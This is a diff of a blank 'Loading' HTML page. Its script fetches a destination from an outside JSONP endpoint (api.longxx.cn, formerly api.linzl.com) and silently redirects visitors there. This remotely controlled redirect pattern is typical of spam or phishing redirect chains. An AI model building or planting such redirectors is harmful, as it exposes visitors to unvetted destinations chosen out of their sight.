@@ -1,31 +1,40 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta http-equiv="Access-Control-Allow-Origin" content="*"/>
-   <meta charset="utf-8">
-    <title></title>
-  <!--   <script src="https://wangjin-61.oss-cn-shanghai.aliyuncs.com/jin-61/shuang11/static/js/jquery.min.js"></script> -->
-   <script src="https://libs.baidu.com/jquery/2.0.0/jquery.js"></script>
-   
+    <meta charset="UTF-8">
+    <title>加载中</title>
 </head>
 <body>
-</body> 
-    <script>
-         $.ajax({
-            type:"GET",
-            url:'http://api.linzl.com/xx4-232/tentenfu/index_rukou.php', //访问的链接
-            dataType:"jsonp",  //数据格式设置为jsonp
-            jsonp:"callback",  //Jquery生成验证参数的名称
-            data:{
-               
-            },
-            success:function(res){  //成功的回调函数
-                 location.href = res.url;
-            },
 
-            error: function (e) {
-                console.log(e)
-            }
+<script type="text/javascript" src="http://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script>
+ var queryparam = '';
+     window.onload = function () {
+            $.ajax({
+                type: "GET",
+                url: "http://api.longxx.cn/bak/gg/api/api.php",
+                dataType: "jsonp",
+                jsonp: "callback",
+                jsonpCallback: "callback",
+                success: function(res) {
+                  queryparam = getCaption(res.domainname);
+                  
+                  location.href = res.domainname + queryparam;
 
-        });
-    </script>
+                  function getCaption(obj){
+                      var index=obj.lastIndexOf("\?");
+                      obj=obj.substring(index+1,obj.length);
+                      return obj;
+                  }
+
+                },
+                error: function(res) {
+                  location.href = "http://qq.com";
+                }
+            });
+       
+    }
+</script>
+</body>
+
 </html>
